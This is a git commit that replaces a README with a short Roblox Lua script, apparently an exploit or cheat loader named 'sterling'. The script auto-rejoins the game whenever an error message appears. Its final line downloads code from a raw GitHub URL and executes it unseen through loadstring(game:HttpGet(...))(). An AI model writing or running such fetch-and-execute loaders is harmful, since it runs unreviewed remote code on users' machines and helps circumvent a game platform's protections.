1b1c3bb6fccdd04eea0ffc223c8a382514008413
DucDuy-2013 <ducduyhoangkim@gmail.com>
2025-03-16 21:27:34 +0700

    Update and rename README.md to sterling.lua

---
+++ sterling.lua
@@ -0,0 +1,15 @@
+local GuiService = game:GetService("GuiService")
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local player = Players.LocalPlayer
+local function onerrorMessageChanged(errorMessage)
+    if errorMessage and errorMessage ~= "" then
+        print("Error detected: " .. errorMessage)
+        if player then
+            wait()
+            TeleportService:Teleport(game.PlaceId, player)
+        end
+    end
+end
+GuiService.ErrorMessageChanged:Connect(onerrorMessageChanged)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zayn31214/name/refs/heads/main/SterlingNew"))()
